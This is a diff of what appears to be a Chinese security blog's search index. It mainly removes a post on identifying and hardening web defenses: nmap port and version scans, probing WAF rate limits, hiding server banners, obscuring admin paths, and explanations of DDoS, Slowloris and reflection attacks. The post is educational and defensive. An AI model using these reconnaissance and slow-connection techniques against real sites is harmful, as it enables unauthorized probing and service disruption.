@@ -440,7 +440,7 @@
 <p>B-&gt;A：序列号初始为0，Ack+Syn均置为1，且返回包包含Ack&#x3D;1</p>
 <p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20240311095801457.png" alt="第二次请求"></p>
 <p>A-&gt;B：序列号为1，返回Ack&#x3D;1</p>
-<p><img src="/../../../Typora/img111/image-20240311095956233.png" alt="第二次确认"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20240311095956233.png" alt="第二次确认"></p>
 <p>下面开始发送数据，kali发送whoami</p>
 <p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20240311100842828.png" alt="发送数据"></p>
 <p>A-B：发送字节数7，Seq&#x3D;1</p>
@@ -5110,7 +5110,7 @@
 <p>f12扫一眼它的源代码，还有js</p>
 <p>看它的网页功能，主要关注有搜索框和登录入口</p>
 <p>登录可以创建账户，先创建一个</p>
-<p>admin111&#x2F;test&#x2F;test123用户被用过，<a href="mailto:&#x31;&#50;&#51;&#x34;&#53;&#54;&#64;&#x71;&#113;&#x2e;&#x63;&#x6f;&#109;">&#x31;&#50;&#51;&#x34;&#53;&#54;&#64;&#x71;&#113;&#x2e;&#x63;&#x6f;&#109;</a>被用过</p>
+<p>admin111&#x2F;test&#x2F;test123用户被用过，<a href="mailto:&#49;&#50;&#x33;&#x34;&#53;&#54;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;">&#49;&#50;&#x33;&#x34;&#53;&#54;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;</a>被用过</p>
 <p>test123qwe，进入，有填写基本信息，有上传图片功能</p>
 <p>有一个报错</p>
 <p><img src="/../../../Typora/img111/image-20231117111539091.png"></p>
@@ -14197,193 +14197,6 @@
       </tags>
   </entry>
   <entry>
-    <title>web防护及识别</title>
-    <url>/2023/06/11/%E7%94%A8%E6%88%B7%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E9%98%B2%E6%8A%A4%E6%89%8B%E6%AE%B5%E8%AF%86%E5%88%AB/</url>
-    <content><![CDATA[<p>标准的防护方案为从硬件层面利用防火墙封锁高危IP、利用WAF设备在线阻断攻击，或者在Web服务器上开启防火墙、部署相关防护策略等。</p>
-<p>大部分防护手段对攻击的防护效果良好，如各类硬件WAF、各类云WAF、服务器防护软件等。</p>
-<p>在用户视角下进行防护手段的识别，可更有效地发现当前系统的隐藏威胁。</p>
-<h1 id="1-开放端口及对应业务识别"><a href="#1-开放端口及对应业务识别" class="headerlink" title="1.开放端口及对应业务识别"></a>1.开放端口及对应业务识别</h1><p>kali利用nmap对特定ip扫描端口，可以找到一些<strong>open状态的</strong>端口。</p>
-<p>遇到一些是<strong>filtered状态</strong>的端口呢，说明是开放的，但成为阻断状态，说明目标主机不仅限于有防火墙，各类防护软件、配置规则等都能形成filtered的效果。</p>
-<blockquote>
-<p>扫描开放端口的目的在于寻找可与目标服务器交互的点，并且了解目标的具体功能。在进行内网渗透时，这些被防火墙过滤的端口在内网中便可被使用。因此，扫描端口的作用非常多，并可有效扩展攻击目标。</p>
-</blockquote>
-<h1 id="2-是否有防护类软件"><a href="#2-是否有防护类软件" class="headerlink" title="2.是否有防护类软件"></a>2.是否有防护类软件</h1><p>1）直接<strong>利用错误参数打开目标站点的报错页面</strong>。例如，安全狗、360云防护等会在报错页面留有明确信息或特征。这些特征基本上无法修改，并且部分防护软件还会在报错页面中添加广告信息等，这都算是防护软件的一种标识。</p>
-<p>2）<strong>利用NMAP扫描目标站点，查看是否有已开放但被过滤的端口</strong>。如存在这样的端口，基本上可判定服务器前面会有防火墙。如果端口被防火墙过滤，那么此端口在外部无法直接利用。但事无绝对，假设内网数据库服务器开放3306端口并在防火墙处被过滤，则攻击者如果对此网络中任意一台设备成功渗透，就可以在内网利用3306端口开展连接等。</p>
-<p>3）<strong>利用Burpsuite抓取与目标系统通信的响应包，观察HTTP包头的server参数，看是否有WAF相关标识。</strong></p>
-<p>4）<strong>利用目录爆破工具，并从低速逐步升到高速，查看哪些阶段被封锁</strong>。一个没有添加防护设备或防护策略的站点并不会阻拦来自互联网的访问行为。设置安全设备或安全策略时都会考虑针对DDoS攻击的防护，会对来自同一地址的访问频率进行限制。因此<strong>逐步提升访问效率，即可测试出目标站点的阈值</strong>。可利用工具进行测试，</p>
-<h2 id="防护总结"><a href="#防护总结" class="headerlink" title="防护总结"></a>防护总结</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618200336378.png"></p>
-<blockquote>
-<p>搜索结果的 “banner” 是指在网络设备（如服务器、路由器、摄像头等）的响应中返回的特定信息。这些信息通常包含了设备的详细描述、设备型号、软件版本、协议信息等。通过分析设备返回的 banner 信息</p>
-</blockquote>
-<h1 id="3-常用防护方案"><a href="#3-常用防护方案" class="headerlink" title="3.常用防护方案"></a>3.常用防护方案</h1><p>在设计整体防护方案时，大多数人的直观想法是尽可能消灭漏洞。</p>
-<p>但在实际安全防护工作中，由于Web开发人员对安全的理解不足、运维人员的安全技术能力稍弱等因素，均会造成无法在第一时间发现漏洞并将其消除。</p>
-<p>漏洞会随着攻防技术发展不断涌现，而且公司的渗透测试和代码审计服务价格不菲。因此，在设计方案时，必须考虑“适度防护”。</p>
-<p>适度防护的原则是：<strong>建立防护手段，使攻击者的攻击代价（时间成本等）大于攻击成功后的价值</strong>，这样可使攻击者主动放弃攻击目标，从而达到较好的防护效果。</p>
-<h2 id="1-整体防护思路"><a href="#1-整体防护思路" class="headerlink" title="1.整体防护思路"></a>1.整体防护思路</h2><p>考虑整体方式思路时，最优的手段并不是增加大量防护工具或软件，而是先识别攻击者能连接过来的路径及攻击者可看到的信息。</p>
-<p>从攻击者的角度考虑，如果要针对一个系统开展攻击，必须先识别攻击目标的基本特征。对于Web网站来说，其基本特征包含以下几项：</p>
-<blockquote>
-<p>·目标的端口号（确认攻击目标有哪些）。</p>
-<p>·目标中间件及服务的版本（针对版本寻找可用漏洞）。</p>
-<p>·目标是否有明显漏洞等信息。</p>
-</blockquote>
-<p>可见，在防护阶段应尽可能减少有效信息的暴露，这样会极大增加攻击者的攻击难度，明显提升网站的防护效果。</p>
-<h2 id="2-简单防护方案"><a href="#2-简单防护方案" class="headerlink" title="2.简单防护方案"></a>2.简单防护方案</h2><p>中小Web站点的管理人员技术实力有限，无法做到从Web网站代码层面发现漏洞并进行防护。因此，作为中小站点的管理人员，应首先考虑降低当前站点对外提供服务时可被获取有效信息的可能性，并且及时地停用高危服务或端口。再利用漏扫工具扫一遍，查漏补缺。</p>
-<h3 id="1-关闭或修改服务器开放端口"><a href="#1-关闭或修改服务器开放端口" class="headerlink" title="1.关闭或修改服务器开放端口"></a>1.关闭或修改服务器开放端口</h3><p>Web服务器会利用HTTP（TCP80）、HTTPS（TCP443）协议为用户提供Web访问服务。</p>
-<p>除了有特殊端口提供服务，非必要开放端口尽量关闭，如FTP（21）、SSH（22）等。</p>
-<p>如果涉及特殊业务系统必须要<strong>开启特殊端口，建议采用防火墙、iptables等限制非业务端口的连接IP地址</strong>，即利用<strong>白名单技术实现访问控制</strong>，从而尽可能减少外部链接通道。</p>
-<p>针对特殊Web应用环境，如单一IP要实现多个Web应用共存，由于每个Web应用均需要一个独立的TCP端口，因此在这个过程中会涉及非默认端口的情况。针对这种情况，建议将端口设置成为<strong>非常见的端口</strong>。这样，NMAP在利用默认参数进行扫描时就不会发现修改过的端口，也就能避免特定应用被攻击者发现。需要注意的是，如果修改了http&#x2F;https的默认端口，那么后续在访问站点时需要在域名后面添加端口号，如<a href="http://www.xxx.com:30303。访问时添加端口号会给一般用户带来一定的困扰，**因此推荐在各类在线维护系统或内部系统使用**，并且这类系统通常较为敏感及重要，更建议隐藏端口。">http://www.xxx.com:30303。访问时添加端口号会给一般用户带来一定的困扰，**因此推荐在各类在线维护系统或内部系统使用**，并且这类系统通常较为敏感及重要，更建议隐藏端口。</a></p>
-<p>以常见的端口扫描工具NMAP为例，执行如下命令：</p>
-<p><code>#nmap -sS 192.168.1.1</code></p>
-<p>实现的效果是利用SYN对目标进行半开链接扫描。在执行上述命令时，NMAP默认扫描端口是：1～1024端口及NMAP中nmap-services（nmap主目录里面）文件里的端口列表。</p>
-<p>如果配置文件不设置的话，就是默认配置。</p>
-<p>当然了，如果没发现目标端口</p>
-<p><code>nmap -p0-65535 192.168.211.129</code> 扩大端口量即可</p>
-<p><strong>全端口扫描</strong>的时间大约是标准扫描时间的20倍左右。在实际场景中，攻击者会大范围开展扫描。<strong>考虑到扫描速度，基本会采用NMAP的默认端口开展扫描</strong>（全端口扫描会显著降低扫描速度）。</p>
-<blockquote>
-<p><strong>因此，推荐将非HTTP&#x2F;HTTPS默认端口的Web网站（如各类管理后台页面、管理地址等）修改为非NMAP默认端口号，可有效降低被发现的概率。</strong></p>
-</blockquote>
-<h3 id="2-利用防护类工具"><a href="#2-利用防护类工具" class="headerlink" title="2.利用防护类工具"></a>2.利用防护类工具</h3><p>目前，常用的防护类工具分为软件、硬件两种。其中，<strong>硬件</strong>防护工具价格<strong>较贵</strong>，<strong>软件</strong>防护工具<strong>有免费版</strong>可供选择。由于Web站点的独立性，每个站点均有其独特的应用场景及业务流程，这就要求安全工具在配置完毕后需按照Web站点进行相应的规则配置。安全产品及工具如果配置得当，会产生良好的防护效果，<strong>如果仅采用默认配置，则通常只有事倍功半的结果。</strong></p>
-<blockquote>
-<p>针对中小用户，在没有独立机房的情况下可考虑利用各类<strong>在线云WAF</strong>进行防护，或者<strong>部署相关软件</strong>（如安全狗均可），这类工具安装简便且防护效果良好，<strong>再配合各类webshell查杀工具</strong>定期对Web目录进行检查，即可有效提升站点的安全性。</p>
-</blockquote>
-<p>如果Web站点部署在各类云平台上，那么可利用云平台提供的防护类工具开展针对性的安全检查。这类工具的费用及效果均可满足中小企业的需求。例如，阿里云上提供应用安全工具，可按照需求购买，成本非常低。</p>
-<p>但需注意的是，<strong>安全产品内置的防护规则在默认状态下并不完全适合各类型Web站点。</strong>这主要是由于站点的架构及功能特点各不相同而导致的。例如，对于一个技术论坛，其中会针对各类代码进行讨论，这是此站点的正常业务行为，但由于大量含有代码的讨论内容会被防护设备识别成攻击，反而带来不便。因此，在防护类工具选择上，是否购买是一个问题，但如何更好地发挥防护类工具及自定义规则设置是另一个需要考虑的因素。</p>
-<h3 id="3-采用成熟的CMS系统"><a href="#3-采用成熟的CMS系统" class="headerlink" title="3.采用成熟的CMS系统"></a>3.采用成熟的CMS系统</h3><p>成熟的CMS在整体防护策略及安全性方面更加完善。</p>
-<p>有针对各类基础漏洞的防护方法、针对用户传参的参数化查询或者转义架构等。</p>
-<p>当然了，一般格式高度统一，对用户个性化有影响。目前主流的CMS已具备良好的二次开发能力了。</p>
-<h2 id="3-提升安全性的基础手段"><a href="#3-提升安全性的基础手段" class="headerlink" title="3.提升安全性的基础手段"></a>3.提升安全性的基础手段</h2><p>从技术原理上说，仅通过防护类软件，并不一定能完全实现漏洞防护，更不能实现业务层面的逻辑漏洞的防护。因此，最佳手段是在服务器层面提升防护效果等。在了解漏洞的原理之后思考，是否可以<strong>从开始就对漏洞的痕迹进行隐藏</strong>、从开始就对漏洞进行<strong>掩饰</strong>，以<strong>提升攻击者的攻击成本</strong>。</p>
-<h3 id="1-隐藏Web服务器的banner"><a href="#1-隐藏Web服务器的banner" class="headerlink" title="1.隐藏Web服务器的banner"></a>1.隐藏Web服务器的banner</h3><p>在各类应用中，常用<strong>banner信息</strong>来表示<strong>某项中间件或操作系统的特征，其中包含类型（Apache、Tomcat、nginx等）、版本号等信息</strong>。这些信息在渗透测试中非常有价值，主要体现在在特定中间件或操作系统版本上会存在各类已知的高危漏洞。当攻击者获取其对应的版本信息之后，可根据版本信息寻找有效的攻击方式。</p>
-<p>查看banner信息的好处在于，可以根据对应的版本信息寻找其对应的版本漏洞，常见的有以下几种：</p>
-<p><strong>·Apache：存在解析漏洞，range畸形包可导致DDoS攻击。</strong></p>
-<p><strong>·PHP：5.3.4版本之前存在%00截断。</strong></p>
-<p>攻击者获得目标服务器的banner信息方式为：</p>
-<blockquote>
-<p>1.利用NMAP进行扫描</p>
-<p><code>nmap –sV –Pn &#39;target IP&#39;</code></p>
-</blockquote>
-<blockquote>
-<p>2.利用非正常页面查看banner信息</p>
-<p>中间件的默认页面在没有修改的情况下，其返回的页面中会包含对应的banner信息。以常见的404页面为例，利用错误路径触发目标站点显示404页面，就可看到其中的服务器banner。</p>
-</blockquote>
-<blockquote>
-<p>3.抓取服务器response包一样会有服务器信息</p>
-<p>见bp抓的响应包中的server。</p>
-</blockquote>
-<p>目前各类浏览器及Web应用并不需要知道服务器的banner信息，因此可考虑将其关闭或删除。</p>
-<p>几个中间件的banner修改方案如下：</p>
-<h4 id="（l）修改Apache-banner"><a href="#（l）修改Apache-banner" class="headerlink" title="（l）修改Apache banner"></a>（l）修改Apache banner</h4><blockquote>
-<p>关闭版本号显示的方法如下：</p>
-<p>1）找到&#x2F;etc&#x2F;apache2&#x2F;apache2.conf或&#x2F;etc&#x2F;apache2&#x2F;httpd.conf（根据相应的Linux发行版选择）。</p>
-<p>2）找到项目，将ServerSignature on改为ServerSignature off。</p>
-<p>3）找到项目，将ServerTokens Full改为ServerTokens prod。</p>
-</blockquote>
-<p>以上两项均需修改，如果部分Apache版本的配置文件中没有上述配置，那么直接在http.conf中添加上述两行配置即可。</p>
-<p>修改完成之后重新进行检查。先利用Burpsuite抓包，可发现在response中已不显示版本情况。</p>
-<p>如果要替换banner名称为专有，可编辑<strong>ap_release.h文件</strong>，方法如下：修改<code>&quot;#define AP_SERVER_BASEPRODUCT&quot;Apache&quot;&quot;为&quot;#define AP_SERVER_BASEPRODUCT&quot;Microsoft-IIS/7.0&quot;</code>。这是一种欺骗的方法，能有效迷惑攻击者。毕竟Apache中怎么也不会存在IIS的漏洞，如果攻击者根据修改后的banner进行大量攻击尝试，也不会产生任何安全威胁。</p>
-<h4 id="（2）PHP版本号关闭"><a href="#（2）PHP版本号关闭" class="headerlink" title="（2）PHP版本号关闭"></a>（2）PHP版本号关闭</h4><blockquote>
-<p>关闭PHP版本号的方法为打开php.ini配置文件，找到expose_php On项目，将其修改为expose_php off即可。</p>
-<p>修改完毕后可重新抓取response包，发现X-Powered-By中的PHP版本号已消失，</p>
-</blockquote>
-<h4 id="（3）修改Nginx-Banner"><a href="#（3）修改Nginx-Banner" class="headerlink" title="（3）修改Nginx Banner"></a>（3）修改Nginx Banner</h4><blockquote>
-<p>修改Nginx配置中的相关项目，方法与Apache的方式类似。修改Server_tokens的值为off。修改后的效果类似Apache。</p>
-</blockquote>
-<h4 id="（4）修改系统默认TTL"><a href="#（4）修改系统默认TTL" class="headerlink" title="（4）修改系统默认TTL"></a>（4）修改系统默认TTL</h4><p>用以下命令修改Red Hat Linux的TTL基数为128（默认为64）：</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;echo 128 &gt; /proc/sys/net/ipv4/ip_default_ttl</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;net.ipv4.ip_default_ttl = 128</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>修改版本号只是提高了攻击者的攻击时间成本，有效的防护措施依然是对现有漏洞进行发现和处理。不过由于攻击时间长，可为系统管理员争取一段发现时间，因此定期观察系统日志或利用各类防护系统观察攻击行为，也可尽早发现攻击者并采取后续处理措施。</p>
-<h3 id="2-robots-txt"><a href="#2-robots-txt" class="headerlink" title="2.robots.txt"></a>2.robots.txt</h3><p>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除协议”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取、哪些页面不能抓取。</p>
-<blockquote>
-<p>当一个搜索引擎的爬虫访问站点时，它会首先检查该站点的根目录下是否存在robots.txt，如果该文件存在，搜索机器人就会按照该文件中的内容来确定访问的范围；<strong>如果该文件不存在</strong>，所有的搜索引擎的爬虫将能够访问网站上所有没有被口令保护的页面。因此建议，<strong>仅当网站包含不希望被搜索引擎收录的内容时，才使用robots.txt文件</strong>；如果希望搜索引擎收录网站上所有内容，则不要建立robots.txt文件。</p>
-</blockquote>
-<p>使用robots.txt的好处在于，可清晰告知搜索引擎的爬虫哪些页面不能被收录，哪些页面可以被收录，从而避免敏感文件被访问。但是，robots.txt本身可以公开访问（搜索引擎的爬虫为公开环境），攻击者只需观察robots.txt里面的内容，也可能发现有效的内容。</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618222437042.png" alt="robots.txt文件样例"></p>
-<p>利用disallow的方式可理解为黑名单的方式，甚至可以直接告知攻击者，哪些连接我是不想让搜索引擎收录的。</p>
-<p>为了解决这个问题，建议将传统的robots.txt替换为sitemap。目前主流搜索引擎均支持sitemap。sitemap也叫做网站XML地图，用以格式化地标注网站的整体结构。</p>
-<p>例如，百度支持三种sitemap格式：txt文本格式、xml格式、sitemap索引格式。目前常用的为xml格式。</p>
-<p>以上海移动网上营业厅（<a href="http://www.sh.10086.cn)为例,其主目录下的robots.txt/">www.sh.10086.cn）为例，其主目录下的robots.txt</a></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618222651935.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent：*</span><br><span class="line">Disallow：</span><br></pre></td></tr></table></figure>
-
-<p>表示允许一切搜索引擎的爬虫爬取网站信息。</p>
-<p>接下来，用sitemap告知搜索引擎，该站的网站地图连接在哪里，直接读取此xml文件即可获得网站的结构。</p>
-<p><strong>其优点在于利用sitemap告知了搜索引擎爬虫网站可公开的结构有哪些，其余的信息不能被爬取。</strong>这相当于实现了白名单的效果，从而很好地规避了传统写法的缺陷，值得推荐。</p>
-<h3 id="3-提升后台地址复杂度"><a href="#3-提升后台地址复杂度" class="headerlink" title="3.提升后台地址复杂度"></a>3.提升后台地址复杂度</h3><p>假设<strong>前台</strong>存在SQL注入漏洞，或者管理员用户及密码已经被攻击者掌握，那么攻击者希望找到目标站点的<strong>后台地址</strong>，以便开展后续攻击。如果后台地址无法被攻击者发现，那么攻击者空有之前成果，无法登录后台开展后续攻击。</p>
-<p>攻击者常用的寻找后台地址的方法就是利用搜索引擎，搜索admin相关的字眼，确认是否有后台等。</p>
-<p>在大部分情况下，利用搜索引擎并不能直接发现后台，这时攻击者常用的手段就是<strong>地址爆破</strong>。地址爆破的方法是拼接URL，URL由当前“域名+常用后台地址库”进行构造，再顺序访问构造后的URL是否存在，从而对目标网站的后台地址进行爆破。目录爆破类工具是利用<strong>已经定义的后台地址库进行重复尝试</strong>，并对成功返回的地址进行尝试，从而发现后台地址。</p>
-<p>作为网站所有者，<strong>基本的手段为加强后台地址复杂度</strong>，避免后台地址出现在攻击者的后台地址库中。常见的后台地址设计方案如下：</p>
-<blockquote>
-<p>1）将几组方便记忆的信息转换为MD5（可加SALT），再反序等；或者利用其他方式加强难度。方案可自行设计。这样做可显著提高攻击者爆破后台目录的时间成本。</p>
-<p>2）还有一种情况在一些早期网站中经常出现：即在前台页面中有一项进入后台管理的功能，这会直接导致当前站点的后台地址暴露。这也就是搜索引擎会将后台地址进行收录的原因。</p>
-</blockquote>
-<h2 id="4-DDoS攻击及防护方法"><a href="#4-DDoS攻击及防护方法" class="headerlink" title="4.DDoS攻击及防护方法"></a>4.DDoS攻击及防护方法</h2><p>分布式拒绝服务（Distributed Denial of Service，DDoS）攻击指利用<strong>多个节点</strong>，<strong>通过各类协议对目标发动大量链接或大流量行为</strong>，导致目标由于性能及带宽原因，无法有效处理来自攻击节点的各类访问请求，最终实现服务终止的情况。</p>
-<p>DDoS攻击无法造成服务器权限或数据的丢失，但会造成Web服务停止运行。</p>
-<h3 id="1-DDos主要攻击方式"><a href="#1-DDos主要攻击方式" class="headerlink" title="1.DDos主要攻击方式"></a>1.DDos主要攻击方式</h3><h4 id="1-传输层洪泛攻击"><a href="#1-传输层洪泛攻击" class="headerlink" title="1.传输层洪泛攻击"></a>1.传输层洪泛攻击</h4><p>自建的网站通常要租赁运营商带宽提供Web服务。在这种情况下，由于<strong>带宽有限</strong>，一旦出现DDoS攻击，就算在本地部署了抗DDoS攻击设备且防护效果非常好，也无法恢复正常的Web应用。</p>
-<p>这主要由于防护设备部署在Web服务器前端，但是运营商侧的链路早已被DDoS所<strong>阻塞</strong>死，导致正常流量一直无法达到Web服务器。</p>
-<blockquote>
-<p>就是说运营商分配的正常流量20mb&#x2F;s带宽，而，ddos的攻击流量就有200mb&#x2F;s，这就造成了堵塞</p>
-</blockquote>
-<h4 id="2-针对Web的应用层攻击"><a href="#2-针对Web的应用层攻击" class="headerlink" title="2.针对Web的应用层攻击"></a>2.针对Web的应用层攻击</h4><p>针对HTTP应用层面的攻击比较复杂，主要体现在危害性及其目标特点上。</p>
-<p>常见的DDoS攻击为<strong>CC攻击</strong>，其原理是利用代理服务器或肉鸡节点向Web服务器发起大量请求，造成服务器资源耗尽，达到服务终止的效果。相同类型的攻击还有HTTP GET FLOOG等。</p>
-<blockquote>
-<p>CC攻击（Challenge Collapsar，挑战黑洞）</p>
-</blockquote>
-<p>CC攻击原理是利用代理服务器的强大性能，同时针对单一目标发起大量的请求连接，造成目标系统短时间之内无法处理过多的连接数，进而失去响应。</p>
-<p>相对于4层的SYN&#x2F;ICMP等占用带宽的DDoS攻击而言，CC攻击主要是为了占用<strong>服务器的连接资源</strong>。虽然占用目的不同，但实现效果一样。在很多场景下，CC攻击常<strong>通过消耗目标服务器的性能</strong>来实现拒绝服务的效果。</p>
-<p>总之，<strong>针对Web的应用层攻击就是利用大量请求来消耗目标服务器的硬件资源，实现拒绝服务的目的。</strong>针对这类攻击，通过各类<strong>云WAF或者CDN</strong>可有效解决。</p>
-<h4 id="3-慢速连接攻击"><a href="#3-慢速连接攻击" class="headerlink" title="3.慢速连接攻击"></a>3.慢速连接攻击</h4><p>利用HTTP协议缺陷，伪造缺陷请求包，造成目标服务器中间件针对缺陷包的处理异常，从而实现服务器拒绝的效果，这类利用协议缺陷实现的攻击就叫做慢速连接攻击。</p>
-<p>特点是利用极低带宽即可实现DDoS攻击效果，相对于CC&#x2F;HTTP get flood攻击来说，其带宽占用极小。</p>
-<p>这种攻击主要有以下几种形式：</p>
-<blockquote>
-<p>（1）Slowloris攻击</p>
-<p>HTTP协议规定，HTTP Request以\r\n\r\n（0d0a0d0a）结尾表示客户端发送结束。</p>
-<p>攻击者在HTTP请求头中将Connection设置为Keep-Alive，要求Web服务器保持TCP连接不要断开，随后缓慢地每隔几分钟发送一个key-value格式的数据到服务器端，如a：b\r\n，导致服务器端认为HTTP头部没有接收完成而一直等待。</p>
-<p>如果攻击者使用多线程或者多节点来做同样的操作，<strong>服务器的Web的连接数量很快就被攻击者占满</strong>，导致无法接受新的TCP连接请求。</p>
-<p>kali自带一个slowhttptest工具</p>
-</blockquote>
-<p>正常http包结尾都是\r\n\r\n（0d0a0d0a），如果有一个包结尾是\r\n，也就是少了一组\r\n，会导致低版本中间件在接收到HTTP畸形包之后会一直保持连接打开的状态，进而实现链接占用，达到DDoS攻击的效果。</p>
-<blockquote>
-<p>（2）Slow HTTP POST</p>
-<p>为slowloris攻击的变种形式，利用POST的方式开展攻击。</p>
-<p>其核心思路是利用POST包允许在HTTP的头中声明content-length（POST包内容长度）的特点。具体原理为：在提交了相应的HTTP头以后，<strong>不发送HTTP包的body部分</strong>，导致服务器在<strong>接受了POST长度声明</strong>后会持续等待客户端发送POST的内容。假设攻击者保持连接并且以每隔10～100S一个字节的速度去发送，从而达到消耗Web服务器连接资源的效果。因此，不断地增加这样的链接，就会使得服务器的资源被消耗，最后导致拒绝服务的效果。</p>
-</blockquote>
-<blockquote>
-<p>（3）Slow Read Attack</p>
-<p>原理为通过<strong>调整TCP协议中的滑动窗口大小</strong>来对服务器单次发送的数据大小进行控制，使得服务器要<strong>将一个回应分成很多个包发送</strong>。要使这种攻击效果更加明显，请求的资源应尽量大。</p>
-</blockquote>
-<p>总体来说，DDoS攻击的简单、暴力特性，导致即使在服务器端添加抗DDoS类设备<strong>也无法阻止各类带宽占用</strong>的情况。但是，可以根据业务特定适当调优，<strong>提升中间件版本</strong>，避免Web应用层攻击和各类慢速连接攻击带来的危害。目前大部分<strong>运营商或者IDC均提供在线的DDoS攻击流量清洗服务</strong>，防护效果良好，可根据实际情况选用。</p>
-<h4 id="4-反射型DDoS攻击"><a href="#4-反射型DDoS攻击" class="headerlink" title="4.反射型DDoS攻击"></a>4.反射型DDoS攻击</h4><p>(Distributed Reflection Denial of Service，DRDOS)的主要特点是利用互联网公共服务（如DNS、NTP等）实现。</p>
-<p>攻击者将要<strong>攻击的目标伪造成查询发起方</strong>，<strong>并发送给这些公共服务</strong>。公共服务接收到请求包后，将查询结果返回到被攻击目标上。因此在大量伪造请求发起后，被攻击方会接收到大量的查询结果，导致链路严重阻塞，产生拒绝服务的效果。</p>
-<p>反射型DDoS攻击的特点在于可利用<strong>非常小的流量</strong>实现针对目标的<strong>超大流量DDoS攻击</strong>，因此，其<strong>攻击成本非常低</strong>，且带宽阻塞效果显著。由于攻击流量的实际发起方为互联网公共服务，且带宽阻塞无法通过本地的设备进行防护（主要是由于运营商侧的带宽已经占满），其危害也非常严重。目前基于DNS服务、NTP服务、Web服务等都能实现这类效果。从被攻击端观察攻击特点，会发现这非常类似于传输层的DDoS攻击。</p>
-<p>反射型DDoS攻击实施简单，效果良好，且对攻击方的带宽占用非常低，因此使用频率非常高。作为防御者，<strong>针对带宽占用</strong>，解决方案是利用运营商链路的<strong>流量清洗</strong>或者各类云平台的清洗服务。仅在系统前端部署防护类攻击基本无效果，这一点需要注意。</p>
-<h4 id="5-如何解决DDoS攻击问题"><a href="#5-如何解决DDoS攻击问题" class="headerlink" title="5.如何解决DDoS攻击问题"></a>5.如何解决DDoS攻击问题</h4><p>为DDoS虽然不会对服务器的权限产生影响，但DDoS攻击直接会导致Web服务器失效，也就是业务停用，这对Web服务的可靠性造成极大影响，特别是会影响客户对网站的信任。因此，DDoS这种暴力破坏业务可用性的攻击手段因其简单粗暴性决定了其流行程度。</p>
-<p>主要是<strong>利用TCP协议实现大量的链接</strong>，或者利用HTTP应用等实现GET FLOOD、CC攻击等。从攻击原理上说，可利用SYN、ACK、FIN三种TCP的协议规范进行DDoS攻击。</p>
-<p>在防护DDoS攻击方面，标准的防护方式就是<strong>统计来自同一目标的请求频率及特点</strong>，并根据业务特点<strong>设定阈值</strong>。比如针对<strong>同一IP</strong>，每秒监测的SYN包阈值可设定为8000，那么当SYN包超过8000时，就将其丢弃，具体丢弃方法根据业务特点而定。比如，全部丢弃可实现针对单一IP的一段时间禁封；也可对超过阈值的部分进行丢弃，只允许阈值内的包通过。</p>
-<p>这里有一个问题需要说明。在判断DDoS的危害方面，<strong>最为科学的指标为pps数（即每秒接收处理数据包数）</strong>，<strong>其次才是DDoS流量大小</strong>。因为在DDoS攻击中，若带宽相同，攻击者发送的攻击数据包越小，则对应单位流量下的数据包越多，即pps数越高时。由于各类设备针对数据包处理也有阈值，因此相应的防护系统处理DDoS攻击的难度就会越大。因此，常用的以Mbps来表示的DDoS攻击量，有时并不能客观体现DDoS攻击的强度。</p>
-<p><strong>在DDoS攻击防护方面，目前的抗拒绝服务攻击设备都能针对上述DDoS攻击提供较好的防护效果。</strong>运营商在其主干链路中也部署了大量的旁路抗拒绝服务攻击设备。运营商旁路部署抗拒绝服务攻击设备原理是利用动态路由协议特性实现的效果，将牵引设备添加到当前BGP路由表中。当牵引设备发现当前链路中出现DDoS攻击行为时，会通过将当前链路通过更新动态路由表的方式将流量牵引至抗DDoS设备，并在对DDoS攻击流量进行清洗后将正常流量汇注到当前网络内。</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619152154089.png" alt="抗DDoS系统旁路部署图"></p>
-<p><strong>在旁路部署时，如果出现DDoS攻击流量，防护设备对DDoS流量会进行自动牵引和清洗。</strong>这样做的好处在于整体过程对现有的传输不造成影响。由于在正常情况下流量不经过抗DDoS设备，因此不会对当前业务造成延迟，因而广泛用于各级运营商、各级骨干链路等。针对普通用户而言，旁路部署的意义不大，建议通过接口串联或者利用运营商或IDC提供的DDoS攻击清洗服务进行防御。</p>
-<p>总体来说，DDoS攻击的技术简单、粗暴，其目的在于破坏目标网站的业务可用性。虽然无法获得目标服务器的权限及数据，但是随着目前互联网在线应用的日益增多及用户针对Web系统的依赖性增强，导致DDoS的效果反而非常良好。目前国内各大云服务提供商或链路提供商均已提供<strong>在线防护或清洗服务</strong>，因此从防护角度来说不必太担心。但这种攻击行为始终会影响系统的正常工作，在未来，各类DrDos等攻击行为及技术仍然还会存在较长时间。</p>
-<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h1><p>攻击者在针对一个<strong>Web系统开展攻击</strong>时，必须知道<strong>目标的基本信息及可通行的路径</strong>，否则就是在进行大量无意义的尝试。因些，从<strong>防御角度</strong>，建议利用各类<strong>Web扫描器配合人工检查</strong>，对现有业务系统进行全面的安全测试，</p>
-<p>总体来说，中小站点在安全防护的提升阶段可采用以下思路：</p>
-<p>1）<strong>隐藏站点的敏感信息，如各类端口、各类目录等</strong>。同时，利用各类搜索引擎在互联网上搜索站点的内容，尝试发现有价值的内容，并进行针对性处理。</p>
-<p>2）<strong>检查业务体系安全状况，隐藏后台地址，提升管理用户的密码强度或者限制登录范围等。</strong>同时，根据第二部分介绍的业务安全体系流程进行业务安全分析。</p>
